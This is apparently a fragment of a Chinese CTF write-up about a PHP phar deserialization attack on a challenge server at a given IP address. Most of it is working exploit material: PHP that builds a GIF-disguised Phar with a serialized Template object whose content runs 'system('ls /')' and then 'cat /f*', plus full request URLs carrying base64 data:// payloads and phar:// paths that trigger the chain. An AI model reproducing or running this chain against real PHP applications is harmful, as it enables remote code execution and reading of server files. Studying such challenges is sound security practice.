+<p><a href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/2d867d52da656654f238ad3f2eceda1d.html&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/2d867d52da656654f238ad3f2eceda1d.html&amp;tp=tp1</a></p>
+<p><img src="/assets/1747658344956718479055138235582-20250519203906-jvepfqt.png" alt="1747658344956718479055138235582"></p>
+<p><strong>测试根目录</strong></p>
+<pre><code class="language-php">&lt;?php
+class Template{
+	public $content = &quot;&lt;?php system(&#39;ls /&#39;);?&gt;&quot;;
+	public $pattern;
+	public $suffix = &quot;.php&quot;;
+
+}
+$o = new Template();
+$phar = new Phar(&quot;phar.phar&quot;);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头
+$phar-&gt;setMetadata($o); //将自定义meta-data存入manifest
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+$phar-&gt;stopBuffering();  
+
+?&gt; 
+</code></pre>
+<p><a href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqeAAAAAQAAABEAAAABAAAAAABoAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjIzOiI8P3BocCBzeXN0ZW0oJ2xzIC8nKTs/PiI7czo3OiJwYXR0ZXJuIjtOO3M6Njoic3VmZml4IjtzOjQ6Ii5waHAiO30IAAAAdGVzdC50eHQEAAAA3yO5ZAQAAAAMfn/YtgEAAAAAAAB0ZXN0ytJDUfSL2VfkbJ2LEtfOtvBCIMUCAAAAR0JNQg==&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqeAAAAAQAAABEAAAABAAAAAABoAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjIzOiI8P3BocCBzeXN0ZW0oJ2xzIC8nKTs/PiI7czo3OiJwYXR0ZXJuIjtOO3M6Njoic3VmZml4IjtzOjQ6Ii5waHAiO30IAAAAdGVzdC50eHQEAAAA3yO5ZAQAAAAMfn/YtgEAAAAAAAB0ZXN0ytJDUfSL2VfkbJ2LEtfOtvBCIMUCAAAAR0JNQg==&amp;tp=tp1</a></p>
+<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;7cddc639132e5953bf969cc3c9b08fd7&#x2F;ed5cb36b19cdb7f89f98caaa83efda37.html</p>
+<p><a href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/ed5cb36b19cdb7f89f98caaa83efda37.html&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/ed5cb36b19cdb7f89f98caaa83efda37.html&amp;tp=tp1</a></p>
+<p><img src="/assets/17476583692577796986138384772586-20250519203930-ih4wpf3.png" alt="17476583692577796986138384772586"></p>
+<p><strong>获取flag</strong></p>
+<pre><code class="language-php">&lt;?php
+class Template{
+	public $content = &quot;&lt;?php system(&#39;cat /f*&#39;);?&gt;&quot;;
+	public $pattern;
+	public $suffix = &quot;.php&quot;;
+
+}
+$o = new Template();
+$phar = new Phar(&quot;phar.phar&quot;);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头
+$phar-&gt;setMetadata($o); //将自定义meta-data存入manifest
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+$phar-&gt;stopBuffering();  
+
+?&gt; 
+</code></pre>
+<p><a href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqjAAAAAQAAABEAAAABAAAAAABtAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjI4OiI8P3BocCBzeXN0ZW0oJ2NhdCAvZmxhZycpOz8+IjtzOjc6InBhdHRlcm4iO047czo2OiJzdWZmaXgiO3M6NDoiLnBocCI7fQgAAAB0ZXN0LnR4dAQAAAB1JblkBAAAAAx+f9i2AQAAAAAAAHRlc3QyIp89T4AF5NafJYGx4f8/1grOagIAAABHQk1C&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqjAAAAAQAAABEAAAABAAAAAABtAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjI4OiI8P3BocCBzeXN0ZW0oJ2NhdCAvZmxhZycpOz8+IjtzOjc6InBhdHRlcm4iO047czo2OiJzdWZmaXgiO3M6NDoiLnBocCI7fQgAAAB0ZXN0LnR4dAQAAAB1JblkBAAAAAx+f9i2AQAAAAAAAHRlc3QyIp89T4AF5NafJYGx4f8/1grOagIAAABHQk1C&amp;tp=tp1</a></p>
+<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;7cddc639132e5953bf969cc3c9b08fd7&#x2F;50d6dc5cc571407544cd2bff51338b7e.html</p>
+<p><a href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/50d6dc5cc571407544cd2bff51338b7e.html&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/50d6dc5cc571407544cd2bff51338b7e.html&amp;tp=tp1</a></p>
+<p>步骤是对的可能没有写flag嘿嘿 到此结束！</p>
